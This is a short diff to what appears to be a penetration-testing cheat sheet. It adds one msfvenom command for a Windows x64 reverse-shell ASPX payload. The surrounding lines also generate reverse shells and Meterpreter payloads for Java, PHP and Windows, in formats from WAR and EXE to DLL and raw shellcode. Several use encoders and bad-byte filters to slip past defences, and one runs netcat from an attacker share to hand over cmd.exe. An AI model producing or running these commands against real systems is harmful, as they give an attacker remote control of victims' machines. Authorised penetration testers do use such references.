@@ -495,6 +495,7 @@ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f WAR > <F
 $ msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e php/base64 -f raw
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o "r'<FILE>.exe"
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
 $ msfvenom -p windows/x64/exec CMD='\\<LHOST>\PATH\TO\SHARE\nc.exe <LHOST> <LPORT> -e cmd.exe' -f dll > <FILE>.dll
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\x00' -f exe    # -b is bad bytes
